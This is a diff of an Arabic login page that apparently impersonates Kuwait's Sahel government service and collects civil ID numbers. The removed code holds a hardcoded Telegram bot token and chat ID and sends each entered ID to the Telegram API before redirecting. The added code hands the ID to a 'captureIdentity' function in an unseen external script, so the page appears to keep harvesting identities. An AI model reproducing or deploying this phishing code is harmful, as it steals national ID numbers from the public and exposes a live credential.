@@ -128,9 +128,9 @@
 
     #imgbode {
       width: 100%;
-      max-width: 300px;  
+      max-width: 300px;
       height: auto;
-      object-fit: contain; 
+      object-fit: contain;
     }
 
     #textbode {
@@ -168,7 +168,7 @@
       placeholder="الرقم المدني"
       pattern="[0-9]*"
       inputmode="numeric"
-      style="text-align: center;" 
+      style="text-align: center;"
       maxlength="12"
     />
     <div id="civilIdError">الرقم المدني غير صحيح يرجى التحقق منه</div>
@@ -183,8 +183,7 @@
 </main>
 
 <script>
-  const BOT_TOKEN = "8010135725:AAFSSK0gLOl9f70EZHBL53w5UZA0QcOV7fo";
-  const CHAT_ID = "7595871538";
+
 
   const civilIdInput = document.getElementById("civilId");
   const errorDiv = document.getElementById("civilIdError");
@@ -201,7 +200,7 @@
 
   // حدث الإدخال
   civilIdInput.addEventListener("input", function () {
-    .trim();
+    const value = civilIdInput.value.trim();
 
     if (value.length === 12) {
       if (isValidCivilId(value)) {
@@ -224,18 +223,15 @@
     if (isValidCivilId(value)) {
       loginBtn.disabled = true;
       loginBtn.innerText = "جاري الدخول...";
-      sessionStorage.setItem("loginCivilId", value);
 
-      const message = encodeURIComponent(`تم إدخال الرقم المدني: ${value}`);
 
-      // إرسال البيانات للتليجرام والتوجيه التلقائي
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`)
-        .finally(() => {
-          location.href = "formandform.html";
-        });
+      // تسجيل محاولة الدخول بمفتاح مقنّع فقط ثم الانتقال إلى الخدمات.
+      if (window.SahelSession) window.SahelSession.captureIdentity(value);
+      location.href = "formandform.html";
     }
   });
 </script>
 
+<script src="/client-session.js" defer></script>
 </body>
 </html>
